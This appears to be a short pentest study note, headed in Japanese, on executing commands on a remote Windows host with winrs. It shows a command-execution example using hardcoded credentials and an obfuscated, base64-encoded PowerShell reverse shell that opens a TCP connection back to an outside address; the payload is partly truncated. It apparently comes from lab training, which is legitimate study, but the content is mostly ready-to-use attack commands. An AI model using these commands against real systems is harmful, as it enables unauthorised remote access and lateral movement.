## ## Windowsからコマンドの実施
- RCE
```powershell
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```
![file://C:/Users/alien/AppData/Local/Temp/.B6HJ62/1.png](file://C:/Users/alien/AppData/Local/Temp/.B6HJ62/1.png)

- ReverseShell
```powershell
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
![file://C:/Users/alien/AppData/Local/Temp/.B6HJ62/2.png](file://C:/Users/alien/AppData/Local/Temp/.B6HJ62/2.png)